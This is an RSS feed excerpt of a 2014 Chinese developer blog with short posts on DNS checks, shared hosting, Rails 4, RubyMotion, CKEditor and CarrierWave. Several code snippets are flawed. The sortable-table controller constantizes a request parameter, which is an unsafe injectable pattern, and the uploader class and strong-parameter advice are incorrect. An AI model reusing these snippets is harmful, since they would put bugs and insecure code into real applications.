&lt;p&gt;2. 万网备案：&lt;a href="http://aliyun.gein.cn/webbaaliyun/baIspInfoManage.action?isShowConnectSitePrompt="&gt;http://aliyun.gein.cn/webbaaliyun/baIspInfoManage.action?isShowConnectSitePrompt=&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;坏消息是 目测只能备案 常见域名， &amp;#160;不能备案别国域名？&lt;/p&gt;</description>
      <pubDate>Mon, 10 Nov 2014 23:38:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-bei-an-in-mainland</link>
    </item>
    <item>
      <title>关于DNS配置的测试( testing your dns config )</title>
      <description>&lt;p&gt;DNS 的速度直接关系到网站的打开速度.&amp;#160;&lt;/p&gt;
&lt;p&gt;这些日子我发现自己的域名( siwei.me ) 打开的速度比较慢,有时候还打不开. 公司负责的一个项目也出现了同样的问题. &amp;#160;后来发现是国内无法访问 godaddy 的域名服务器造成的. &amp;#160; (参考: &lt;a href="http://www.dnsgua.com/"&gt;http://www.dnsgua.com/&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;所以DNS配置后,检查是否生效就很重要.&amp;#160;&lt;/p&gt;
&lt;p&gt;比如,我今天的siwei.me 的 dns route 是: (来这里: &lt;a href="http://www.simpledns.com/lookup-dg.aspx"&gt;http://www.simpledns.com/lookup-dg.aspx&lt;/a&gt; )&lt;/p&gt;
&lt;pre&gt;Trace DNS Delegation

Tracing DNS delegation for "siwei.me":

Loading root server list (static data):
-&amp;gt; a.root-servers.net (198.41.0.4)
-&amp;gt; b.root-servers.net (192.228.79.201)
-&amp;gt; c.root-servers.net (192.33.4.12)
-&amp;gt; d.root-servers.net (128.8.10.90)
-&amp;gt; e.root-servers.net (192.203.230.10)
-&amp;gt; f.root-servers.net (192.5.5.241)
-&amp;gt; g.root-servers.net (192.112.36.4)
-&amp;gt; h.root-servers.net (128.63.2.53)
-&amp;gt; i.root-servers.net (192.36.148.17)
-&amp;gt; j.root-servers.net (192.58.128.30)
-&amp;gt; k.root-servers.net (193.0.14.129)
-&amp;gt; l.root-servers.net (199.7.83.42)
-&amp;gt; m.root-servers.net (202.12.27.33)
Sending request to "j.root-servers.net" (192.58.128.30)
Received referral response - DNS servers for "me":
-&amp;gt; a2.me.afilias-nst.info (199.249.119.1)
-&amp;gt; d0.cctld.afilias-nst.org (199.254.62.1)
-&amp;gt; ns.nic.me (89.188.44.44)
-&amp;gt; b0.cctld.afilias-nst.org (199.254.60.1)
-&amp;gt; c0.cctld.afilias-nst.info (199.254.61.1)
-&amp;gt; a0.cctld.afilias-nst.info (199.254.59.1)
-&amp;gt; b2.me.afilias-nst.org (199.249.127.1)
-&amp;gt; ns2.nic.me (89.188.44.88)
Sending request to "c0.cctld.afilias-nst.info" (199.254.61.1)
Received referral response - DNS servers for "siwei.me":
-&amp;gt; ns55.domaincontrol.com (no IP address)
-&amp;gt; ns56.domaincontrol.com (no IP address)
Attempting to resolve DNS server name "ns55.domaincontrol.com"  (details not logged)
Resolved DNS server name "ns55.domaincontrol.com" to IP address 216.69.185.28
Sending request to "ns55.domaincontrol.com" (216.69.185.28)
Received authoritative (AA) response:
-&amp;gt; Answer: A-record for siwei.me = 106.186.19.250
-&amp;gt; Authority: NS-record for siwei.me = ns56.domaincontrol.com
-&amp;gt; Authority: NS-record for siwei.me = ns55.domaincontrol.com

&lt;/pre&gt;
&lt;p&gt;可以看到, siwei.me 的最终 dns server是 godaddy 提供的 .&lt;/p&gt;
&lt;p&gt;再看一下: weixin.pe 的:&lt;/p&gt;
&lt;pre&gt;Trace DNS Delegation

Tracing DNS delegation for "weixin.pe":

Loading root server list (static data):
-&amp;gt; a.root-servers.net (198.41.0.4)
-&amp;gt; b.root-servers.net (192.228.79.201)
-&amp;gt; c.root-servers.net (192.33.4.12)
-&amp;gt; d.root-servers.net (128.8.10.90)
-&amp;gt; e.root-servers.net (192.203.230.10)
-&amp;gt; f.root-servers.net (192.5.5.241)
-&amp;gt; g.root-servers.net (192.112.36.4)
-&amp;gt; h.root-servers.net (128.63.2.53)
-&amp;gt; i.root-servers.net (192.36.148.17)
-&amp;gt; j.root-servers.net (192.58.128.30)
-&amp;gt; k.root-servers.net (193.0.14.129)
-&amp;gt; l.root-servers.net (199.7.83.42)
-&amp;gt; m.root-servers.net (202.12.27.33)
Sending request to "d.root-servers.net" (128.8.10.90)
Timeout waiting for response
Sending request to "a.root-servers.net" (198.41.0.4)
Received referral response - DNS servers for "pe":
-&amp;gt; quipu.rcp.net.pe (200.1.176.4)
-&amp;gt; pch.rcp.pe (204.61.216.85)
-&amp;gt; pe1.dnsnode.net (194.146.106.82)
-&amp;gt; sns-pb.isc.org (192.5.4.1)
Sending request to "pe1.dnsnode.net" (194.146.106.82)
Received referral response - DNS servers for "weixin.pe":
-&amp;gt; f1g1ns2.dnspod.net (no IP address)
-&amp;gt; f1g1ns1.dnspod.net (no IP address)
Attempting to resolve DNS server name "f1g1ns2.dnspod.net"  (details not logged)
Resolved DNS server name "f1g1ns2.dnspod.net" to IP addresses:
-&amp;gt; 112.90.143.29
-&amp;gt; 122.225.217.191
-&amp;gt; 180.153.162.150
-&amp;gt; 182.140.167.188
Sending request to "f1g1ns2.dnspod.net" (182.140.167.188)
Received authoritative (AA) response:
-&amp;gt; Answer: A-record for weixin.pe = 106.187.102.120
-&amp;gt; Authority: NS-record for weixin.pe = f1g1ns1.dnspod.net
-&amp;gt; Authority: NS-record for weixin.pe = f1g1ns2.dnspod.net

&lt;/pre&gt;
&lt;p&gt;
可以看出 它用的是 dnspod的, 已经生效了. &lt;/p&gt;
&lt;p&gt;值得一提的是，昨天在godaddy上做了修改，等了一天没生效。把改动删掉，重新弄一下，20分钟左右就生效了。&lt;/p&gt;</description>
      <pubDate>Mon, 10 Nov 2014 00:23:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/dns-testing-your-dns-config</link>
    </item>
    <item>
      <title>不要用 第三方提供的　虚拟空间（注意不是VPS)。( say goodbye to virtual host ) </title>
      <description>&lt;p&gt;我的一个论坛，过去一年在使用　godaddy.com 提供的php　空间。&lt;/p&gt;
&lt;p&gt;怎么说呢，太麻烦。　是一个处处收到限制的空间。　只能跟其他几百个人使用同一个机器。不能用top, 不能用df , 不能做任何其他事情。除了查看自己的home目录。&lt;/p&gt;
&lt;p&gt;我想重启php 服务都要通过ｗｅｂ　页面来做。我想下载sql文件都不能用scp. 更别说ssh. &amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTEvMDkvMTNfNThfMzFfMF9TY3JlZW5zaG90X2Zyb21fMjAxNF8xMV8wOV8xM181NF8wMy5wbmciXV0/Screenshot%20from%202014-11-09%2013%3A54%3A03.png" title="Screenshot From 2014 11 09 13:54:03" alt="Screenshot From 2014 11 09 13:54:03" rel="225x255" width="1920.3999999761581" height="1200.3999999761581" /&gt;&lt;/p&gt;


&lt;pre&gt;-bash-3.2$ scp -P 1080 jia1333405055057.sql root@siwei.me:/opt/app    
/usr/bin/ssh: Permission denied
lost connection
&lt;/pre&gt;
&lt;p&gt;这叫什么事儿。。。。&lt;/p&gt;
&lt;p&gt;需要一提的是，这个虚拟空间就在godaddy　主面板的　web hosting中。&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTEvMDkvMTNfNTlfNTBfODE3X1NjcmVlbnNob3RfZnJvbV8yMDE0XzExXzA5XzEzXzU5XzI1LnBuZyJdXQ/Screenshot%20from%202014-11-09%2013%3A59%3A25.png" title="Screenshot From 2014 11 09 13:59:25" alt="Screenshot From 2014 11 09 13:59:25" rel="225x255" width="1920.3999999761581" height="1200.3999999761581" /&gt;&lt;/p&gt;
&lt;p&gt;它的密码跟godaddy账号的还不一样。　幸亏我把它记了下来，否则还真没法用了。。。。&lt;/p&gt;
&lt;p&gt;goodbye 啦，我还是要用我自己的vps了～～&lt;/p&gt;</description>
      <pubDate>Sun, 09 Nov 2014 05:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/vps-say-goodbye-to-virtual-host</link>
    </item>
    <item>
      <title>使用rspec的几个注意事项( tips using rspec in rails4 )</title>
      <description>&lt;p&gt;1. 务必使用 &amp;#160;$ rails generate rspec:install, 会生成 一个 spec_helper 和一个 rails_helper， 不要改动他们&lt;/p&gt;
&lt;p&gt;2. 务必修改 rails帮你生成好的 &amp;#160;rspec文件。 &amp;#160;把第一行的  spec_helper 改成 rails_helper &lt;/p&gt;
&lt;pre&gt;#  require 'spec_helper'
require 'rails_helper‘ 
&lt;/pre&gt;
&lt;p&gt;否则在运行时会报错，找不到rails相关的东西&lt;/p&gt;
&lt;p&gt;3. 如果使用了 devise, 务必要保证 users表有 email列。 不能使用 attr_accessible 等东西。&lt;/p&gt;
&lt;p&gt;绕了个弯子，昨天耗费了将近2个小时。 记录下来。&lt;/p&gt;</description>
      <pubDate>Wed, 29 Oct 2014 01:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rspec-tips-using-rspec-in-rails4</link>
    </item>
    <item>
      <title>ios开发：页面元素的核心  uiview</title>
      <description>&lt;p&gt;1。 你看到的页面，都是由一个又一个的UIView 叠起来的。&lt;/p&gt;
&lt;p&gt;2. &amp;#160;每个view都是一个2D的矩形。&lt;/p&gt;
&lt;p&gt;3. &amp;#160;起始位置是 （0，0）, 也就是屏幕左上角。&lt;/p&gt;</description>
      <pubDate>Mon, 27 Oct 2014 09:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ios-uiview</link>
    </item>
    <item>
      <title>ios 开发：布局之 tab bar, navigator</title>
      <description>&lt;p&gt;这两个都跟 html中的很像。&amp;#160;&lt;/p&gt;
&lt;p&gt;html 中的 tab 会切换两个DIV， 而 ios 中tab bar (UITabBarControllers) 也是一样：会切换多个controller &amp;#160;对应的view.&lt;/p&gt;
&lt;pre&gt;# in your app_delegate:
class AppDelegate
  def application(application, didFinishLaunchingWithOptions:launchOptions)
      @window = UIWindow.alloc.initWithFrame(UIScreen.mainScreen.bounds)
      @window.makeKeyAndVisible

      controller = TapController.alloc.initWithNibName(nil, bundle: nil)
      nav_controller = UINavigationController.alloc.initWithRootViewController controller

      other_controller = UIViewController.alloc.initWithNibName nil, bundle: nil     
      other_controller.title = 'Other'
      other_controller.view.backgroundColor = UIColor.purpleColor

      tab_controller = UITabBarController.alloc.initWithNibName nil, bundle: nil
      tab_controller.viewControllers = [nav_controller, other_controller]
      @window.rootViewController = tab_controller
      true
  end     
end
&lt;/pre&gt;
&lt;p&gt;navigator (UINavigationControllers) 则是页面最上方的 “前进”， “后退”一样的东东。					
&lt;/p&gt;
&lt;pre&gt;# in your view controller
def viewDidLoad
        right_button = UIBarButtonItem.alloc.initWithTitle 'Push',
            style: UIBarButtonItemStyleBordered, target: self,
            action: 'push'
        self.navigationItem.rightBarButtonItem = right_button
end
&lt;/pre&gt;</description>
      <pubDate>Mon, 27 Oct 2014 07:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ios-tab-bar-navigator</link>
    </item>
    <item>
      <title>rubymotion的入门知识点</title>
      <description>&lt;p&gt;1。 有个 app_delegate. 作为程序入口&lt;/p&gt;
&lt;p&gt;2. 在 app_delegate中，要有个rootview controller.&lt;/p&gt;
&lt;p&gt;3. 每个 view controller, 都要继承 UIViewController.&amp;#160;&lt;/p&gt;
&lt;p&gt;看到 下面的代码，我想说： &amp;#160;&lt;/p&gt;
&lt;pre&gt;  1 class TapController &amp;lt; UIViewController
  2     def viewDidLoad
  3         super
  4         self.view.backgroundColor = UIColor.redColor
  5       
  6         @label = UILabel.alloc.initWithFrame CGRectZero
  7         @label.text = 'hihihi'
  8         @label.sizeToFit
  9         @label.center = CGPointMake self.view.frame.size.width / 2, self.vie    w.frame.size.height / 2
 10         self.view.addSubview @label
 11     end       
 12 end
&lt;/pre&gt;
&lt;p&gt;呵呵&lt;/p&gt;</description>
      <pubDate>Mon, 27 Oct 2014 05:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion</link>
    </item>
    <item>
      <title>使用 preload count解决处理个数问题</title>
      <description>&lt;p&gt;refer to: &lt;a href="https://github.com/smathieu/preload_counts"&gt;https://github.com/smathieu/preload_counts&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Fri, 24 Oct 2014 06:21:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/preload-count</link>
    </item>
    <item>
      <title>rails4中使用cache_action, cache_page</title>
      <description>&lt;p&gt;TODO: 尚未测试。。。不知道是否需要配置 nginx .... 如果是那样的话速度估计会很快。&lt;/p&gt;
&lt;p&gt;refer to: &lt;a href="https://github.com/rails/actionpack-page_caching"&gt;https://github.com/rails/actionpack-page_caching&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;cache_action一直是接口开发的神器，　但是在rails4 中用法略有不同。&lt;/p&gt;
&lt;p&gt;1. in your Gemfile:&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;gem 'actionpack-page_caching'&lt;/p&gt;
&lt;p&gt;2 in your controller:&amp;#160;&lt;/p&gt;
&lt;pre&gt; class ItemsController &amp;lt; ApplicationController
   before_action :authenticate_user!, except: [:index, :show]
+  caches_page :index, :show

   def create
     @item = Item.new(item_params)
     @item.save
+    expire_page action: 'index'
+    expire_page action: 'show', id: @item.id
     redirect_to edit_item_path(@item), notice: '操作成功'
   end
 
   def update
     @item.update(item_params)
+    expire_page action: 'index'
+    expire_page action: 'show', id: @item.id
     redirect_to :back, notice: '操作成功'
   end
 
   def destroy
     @item.destroy
+    expire_page action: 'index'
+    expire_page action: 'show', id: @item.id
     redirect_to :back, notice: '操作成功'
   end

&lt;/pre&gt;
&lt;p&gt;3. in your config file:&amp;#160;&lt;/p&gt;
&lt;pre&gt;# config/environments/production.rb 
 Rails.application.configure do
+  config.action_controller.page_cache_directory = "#{Rails.root.to_s}/public/deploy"
   config.action_mailer.default_url_options = { host: 'localhost', port: 3000 }

&lt;/pre&gt;</description>
      <pubDate>Fri, 24 Oct 2014 06:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails4-cache_action-cache_page</link>
    </item>
    <item>
      <title>使table可以排序  ( sort table in rails ) </title>
      <description>&lt;p&gt;TODO: 把它做成一个gem&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;1. 要有这段js:

&lt;/p&gt;
&lt;pre&gt;  this.make_table_sortable = function(table_css_selector) {
    var base_index, entity_class, this_table;
    this_table = $(table_css_selector);
    base_index = this_table.attr('base_index') || 0;
    entity_class = this_table.attr('entity_class');
    return this_table.sortable({
      axis: 'y',
      dropOnEmpty: false,
      cursor: 'crosshair',
      items: 'tbody tr',
      opacity: 0.4,
      scroll: true,
      update: function() {
        return $.ajax({
          type: 'put',
          data: "" + (this_table.sortable('serialize')) + "&amp;amp;entity_class=" + entity_class + "&amp;amp;base_index=" + base_index,
          dataType: 'json',
          beforeSend: function(xhr) {
            return xhr.setRequestHeader('X-CSRF-Token', $('meta[name="csrf-token"]').attr('content'));
          },
          complete: function(request) {
            return $().toastmessage('showSuccessToast', '排序成功');
          },
          url: "/commons/sort"
        });
      }
    });
  };

&lt;/pre&gt;
&lt;p&gt;in your controller
&lt;/p&gt;
&lt;pre&gt;+# -*- encoding : utf-8 -*-
+class CommonsController &amp;lt; ApplicationController
+
+  # PUT
+  def sort
+    params.permit :entity_class, :base_index, :ids, :position
+    entity_class = params[:entity_class]
+    # 基础偏移量。一般是0. 如果要兼容现有数据，就设置个比现有数据的position还小的初始值
+    base_index = params[:base_index].to_i || 0
+    params[:ids].each_with_index do |id, index|
+      entity_class.constantize.find(id).update_attribute(:position, base_index + index)
+    end
+    render json: 'success'
+  end
+end
&lt;/pre&gt;
&lt;p&gt; in your table: &lt;/p&gt;
&lt;pre&gt;&amp;lt;table class='table table-hover table-striped sortable' entity_class='Item'&amp;gt;
   &amp;lt;tbody&amp;gt;
     &amp;lt;% @items.each do |item| %&amp;gt;
      &amp;lt;tr id='ids_&amp;lt;%= item.id %&amp;gt;'&amp;gt;
   &amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;
&lt;/pre&gt;
&lt;p&gt;in your config.routes: &lt;/p&gt;
&lt;pre&gt;+  resources "commons", :only =&amp;gt; [] do
+    collection do
+      put :sort
+    end
+  end

&lt;/pre&gt;
&lt;p&gt;好玩的是，这个朋友也写了一个文章，不过它的好复杂。我看不懂哈哈。 refer to : &lt;a href="http://benw.me/posts/sortable-bootstrap-tables/"&gt;http://benw.me/posts/sortable-bootstrap-tables/&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Wed, 22 Oct 2014 07:38:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/table-sort-table-in-rails</link>
    </item>
    <item>
      <title>启动Android  emulator (启动安卓虚拟设备) </title>
      <description>&lt;p&gt;refer to &lt;a href="http://xmodulo.com/how-to-run-android-emulator-on-ubuntu-or-debian.html"&gt;http://xmodulo.com/how-to-run-android-emulator-on-ubuntu-or-debian.html&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;基本上，如果你安装好了 rubuto 环境，就可以直接 在 command line &amp;#160;$ android &amp;#160;的方式来启动了。&lt;/p&gt;</description>
      <pubDate>Wed, 22 Oct 2014 06:23:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/android-emulator</link>
    </item>
    <item>
      <title>建立第一个 ruboto项目( create your first ruboto app) </title>
      <description>&lt;p&gt;1. $ ruboto gen app --package com.haihang --path ruboto --name Youle --target android-20 --min-sdk android-17 --activity MainActivityName&lt;/p&gt;</description>
      <pubDate>Wed, 22 Oct 2014 06:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruboto-create-your-first-ruboto-app</link>
    </item>
    <item>
      <title>配置 titanium 开发环境</title>
      <description>&lt;p&gt;refer to &lt;a href="http://docs.appcelerator.com/titanium/latest/#!/guide/Setting_up_Studio-section-37540095_SettingupStudio-installingstudio"&gt;http://docs.appcelerator.com/titanium/latest/#!/guide/Setting_up_Studio-section-37540095_SettingupStudio-installingstudio&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. 到官方网站注册，激活账号。 再补充好资料&lt;/p&gt;
&lt;p&gt;2. 根据不同的平台，下载。我下载的是 Linux 64位。大约100MB&lt;/p&gt;
&lt;p&gt;3. 开始配置&amp;#160;&lt;/p&gt;
&lt;p&gt;System Requirements&lt;/p&gt;
&lt;p&gt;Your system environment must meet the following requirements to run Titanium Studio:&lt;/p&gt;
&lt;p&gt;Operating System: A recent version of Windows, OS X or Ubuntu&lt;br /&gt;Memory: 2 GB RAM (available memory, rather than total memory)&lt;br /&gt;Java Runtime: Oracle JDK (no other brand of Java is suitable) &amp;#160;(只能是 Oracle JDK )&lt;br /&gt;Node.js: required for the Titanium command-line tools like the CLI, Alloy and Node.ACS.&lt;/p&gt;
&lt;p&gt;值得说明的是： &amp;#160;内存要足够大。 需要有2g的空闲内容。 而且只能是Oracle JDK ( 来这里下载 linux 64位包：&lt;a href="http://download.oracle.com/otn-pub/java/jdk/8u25-b17/jdk-8u25-linux-x64.tar.gz"&gt;http://download.oracle.com/otn-pub/java/jdk/8u25-b17/jdk-8u25-linux-x64.tar.gz&lt;/a&gt; )  &lt;/p&gt;
&lt;p&gt; Node.js 0.10.13 or later.&lt;/p&gt;
&lt;p&gt;on Linux, Titanium Studio also requires the GTK windowing system&lt;/p&gt;
&lt;p&gt;Installing Titanium Studio&lt;/p&gt;
&lt;p&gt;The installation procedure for Titanium Studio differs depending on the platform.&lt;/p&gt;
&lt;p&gt;Linux&lt;br /&gt;Once downloaded, open the Titanium Studio .zip archive file by right-clicking on it and choosing the Extract Here menu option&lt;br /&gt;Open the resulting folder, and run the TitaniumStudio executable to launch the application.&lt;/p&gt;
&lt;p&gt;Logging in to Studio&lt;br /&gt;On initial launch, Studio asks you to provide your Appcelerator Network account credentials. Studio requires an internet connection to authenticate the user to the Appcelerator cloud&lt;/p&gt;
&lt;p&gt;Enter your Appcelerator Network credentials.&lt;br /&gt;Optionally click Proxy Setup... to configure your proxy settings if needed.&lt;br /&gt;Click Login.&lt;br /&gt;Studio remembers your login credentials until you sign out of Studio.&lt;/p&gt;
&lt;p&gt;配置升级的步骤：&lt;/p&gt;
&lt;p&gt;1 Window -&amp;gt; Preferences&lt;/p&gt;
&lt;p&gt;Studio -&amp;gt; Platforms&lt;/p&gt; </description>
      <pubDate>Wed, 22 Oct 2014 05:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/titanium</link>
    </item>
    <item>
      <title>使用  ckeditor  gem</title>
      <description>&lt;p&gt;refer to: &lt;a href="https://github.com/galetahub/ckeditor"&gt;https://github.com/galetahub/ckeditor&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1。 安装 imagemagick&lt;/p&gt;
&lt;p&gt;$ sudo apt-get install imagemagick&lt;/p&gt;
&lt;p&gt;2. &amp;#160;vim Gemfile&lt;/p&gt;
&lt;pre&gt;gem 'carrierwave'
gem 'mini_magick'
gem 'ckeditor'
&lt;/pre&gt;
&lt;p&gt;3 
&lt;/p&gt;
&lt;pre&gt;$ rails generate ckeditor:install --orm=active_record --backend=carrierwave&lt;/pre&gt;
&lt;p&gt;4. in application.js:&amp;#160;&lt;/p&gt;
&lt;pre&gt;//= require ckeditor/init&lt;/pre&gt;
&lt;p&gt;5. $ rake db:migrate &lt;/p&gt;
&lt;p&gt;6. 
&lt;/p&gt;
&lt;pre&gt;&amp;lt;%= form_for ... do |f| %&amp;gt;
  &amp;lt;%= f.cktext_area :introduction %&amp;gt;
&amp;lt;% end %&amp;gt;
&lt;/pre&gt;
&lt;p&gt;7. 默认的编辑页面的高度是200px, 需要我们做一些定制，例如增加高度，使用汉语：&lt;/p&gt; 
&lt;pre&gt;$ mkdir app/assets/javascripts/ckeditor/ -p

$ vim config.js: 
CKEDITOR.editorConfig = function( config ) {
	// Define changes to default configuration here. For example:
	// config.language = 'fr';
	// config.uiColor = '#AADC6E';
  config.language = 'zh-CN';
  config.height='600px'
};

&lt;/pre&gt;</description>
      <pubDate>Mon, 20 Oct 2014 06:51:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ckeditor-gem</link>
    </item>
    <item>
      <title>WYSIWYG编辑器 之 ckeditor</title>
      <description>&lt;p&gt;ckeditor的用法极其简单： （refer to: &lt;a href="https://github.com/tsechingho/ckeditor-rails"&gt;&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;1.&amp;#160;gem 'ckeditor_rails'&lt;/p&gt;
&lt;p&gt;2.&amp;#160;Add to your app/assets/javascripts/application.js after //= require jquery_ujs to work with jQuery&lt;/p&gt;
&lt;p&gt;//= require ckeditor-jquery&lt;/p&gt;
&lt;p&gt;3Modify form field for CKEditor&lt;/p&gt;
&lt;p&gt;Add ckeditor class to text area tag&lt;/p&gt;
&lt;p&gt;&amp;lt;%= f.text_area :content, :class =&amp;gt; 'ckeditor' %&amp;gt;&lt;/p&gt;
&lt;p&gt;但是缺点是无法上传图片。&lt;/p&gt;
&lt;p&gt;搜了一圈， ckeditor 有一个上传图片的插件，叫做 ckfinder, 但是需要收费，而且目前支持的只有： .php, &amp;#160;.jsp, &amp;#160;.net &amp;#160;。这完全不符合开元项目的风格啊。要我们手写其实也可以，但是 估计要先 理解所有 &amp;#160;ckeditor的代码。。。所以。。。我们需要新的gem !&amp;#160;&lt;/p&gt;
&lt;p&gt;p.s. 其实也有解决方案的：&lt;/p&gt;
&lt;p&gt;refer to:
&lt;a href="http://stackoverflow.com/questions/3647905/how-exactly-do-you-integrate-ckeditor-with-paperclip-so-it-can-upload-image-file"&gt;http://stackoverflow.com/questions/3647905/how-exactly-do-you-integrate-ckeditor-with-paperclip-so-it-can-upload-image-file&lt;/a&gt;  和  &lt;a href="http://stackoverflow.com/questions/21928348/rails-4-ckeditor-file-upload"&gt;http://stackoverflow.com/questions/21928348/rails-4-ckeditor-file-upload&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;以及一个 完整的gem:&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/galetahub/ckeditor"&gt;https://github.com/galetahub/ckeditor&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;以及：&amp;#160; &lt;a href="http://stackoverflow.com/questions/18752766/rails-4-with-ckeditor"&gt;http://stackoverflow.com/questions/18752766/rails-4-with-ckeditor&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Mon, 20 Oct 2014 03:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/wysiwyg-ckeditor</link>
    </item>
    <item>
      <title>建立3G网页其实很简单( quite easy to write mobile web page) </title>
      <description>&lt;p&gt;只需要把下列代码加到页面中就好：&lt;/p&gt;
&lt;pre&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt; your web site &amp;lt;/title&amp;gt;
&amp;lt;meta charset="utf-8" /&amp;gt;
&amp;lt;meta name="apple-mobile-web-app-title" content=""&amp;gt;
&amp;lt;link rel="apple-touch-icon" href="http://2008mail.sina.com.cn/images/mobile/icon_touch.png"&amp;gt;
&amp;lt;meta name="apple-mobile-web-app-capable" content="yes" /&amp;gt;
&amp;lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"/&amp;gt;
&amp;lt;style type="text/css"&amp;gt;html,body{min-height:100%;overflow:hidden;}&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;header&amp;gt;
&amp;lt;metaname="viewport"content="width=device-width, initial-scale=1"&amp;gt;
&amp;lt;/header&amp;gt;
  &amp;lt;%= yield %&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/pre&gt;
&lt;p&gt;否则页面的文字大小会特别难看。&lt;/p&gt;</description>
      <pubDate>Sun, 19 Oct 2014 08:26:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/3g-quite-easy-to-write-mobile-web-page</link>
    </item>
    <item>
      <title>使用 User-Agent Switcher 在chrome下调试3g 站点</title>
      <description>&lt;p&gt;在chrome下调试 3g站点很简单。 不必每次都要打开手机查看目标网页。
&lt;/p&gt;
&lt;p&gt;直接来下载：&lt;a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg/related"&gt;https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg/related&lt;/a&gt; ，安装就好了。 &lt;/p&gt;
&lt;p&gt;装好之后，chrome右上角就会出现一个 戴墨镜的 图标。 列出了所有可以模拟的设备。&lt;/p&gt;
&lt;p&gt;是不是很cool?&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sun, 19 Oct 2014 00:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/user-agent-switcher-chrome-3g</link>
    </item>
    <item>
      <title>使用carrierwave 上传图片  ( using carrierwave to upload images)</title>
      <description>&lt;p&gt;1 &amp;#160;in Gemfile: &amp;#160; gem 'carrierwave'&lt;/p&gt;
&lt;p&gt;2. &amp;#160;&lt;/p&gt;

&lt;pre&gt;$ rails generate uploader Logo
# this will create file: app/uploaders/logo_uploader.rb
class AvatarUploader &amp;lt; Logo::Uploader::Base
  storage :file
end
&lt;/pre&gt;
&lt;p&gt;3. in your model:&lt;/p&gt;
&lt;pre&gt; class Item &amp;lt; ActiveRecord::Base
+  mount_uploader :logo, LogoUploader
 end
&lt;/pre&gt;
&lt;p&gt;4. in your view:&amp;#160;&lt;/p&gt;
&lt;pre&gt;    &amp;lt;%= f.file_field :logo %&amp;gt;
&lt;/pre&gt;
&lt;p&gt; 5. in controller : &lt;/p&gt;
&lt;pre&gt;# do nothing....  
item.create(params[:item])
# or 
item.logo = params[:file]
item.save

&lt;/pre&gt;
&lt;p&gt;6. usage:&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;lt;%= image_tag @item.logo.url, :style =&amp;gt; 'height: 200px' %&amp;gt;&lt;/p&gt;</description>
      <pubDate>Fri, 17 Oct 2014 06:05:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/carrierwave-using-carrierwave-to-upload-images</link>
    </item>
    <item>
      <title>rails4 strong parameter --- permit and require</title>
      <description>&lt;p&gt;新上手 &amp;#160;rails4的同学可能不知道如何获取 request中的params. 其实很简单：&lt;/p&gt;
&lt;p&gt;rails 2,3: &amp;#160; my_name &amp;#160;= &amp;#160;params[:name]&lt;/p&gt;
&lt;p&gt;rails4 : &amp;#160;需要两行代码：&lt;/p&gt;
&lt;p&gt;params.permit(:name)&lt;/p&gt;
&lt;p&gt;my_name = params[:name]&lt;/p&gt;
&lt;p&gt;（切记，是需要用两行代码） ，这样的写法是错误的：&lt;/p&gt;
&lt;p&gt;my_name = params.permit(:name)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 16 Oct 2014 03:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails4-strong-parameter-permit-and-require</link>
    </item>
    <item>
      <title>面试的几个问题(questions for interview) </title>
      <description>&lt;p&gt;1. 简单介绍自己&lt;/p&gt;
&lt;p&gt;2. 自认你的优势是什么？ 短板是什么？&lt;/p&gt;
&lt;p&gt;3. 用英文描述上一个项目（如果候选人有毕业设计或者工作经验的话）&lt;/p&gt;
&lt;p&gt;4. 将来的职业规划如何？&lt;/p&gt;
&lt;p&gt;5. 如果跟你协同的同学有踢皮球的习惯，该怎么办？如果你接了提给你的皮球，但是又出问题了，该怎么办？会不会承担责任？&lt;/p&gt;
&lt;p&gt;6. 能否接受加班？每天2小时。&lt;/p&gt;
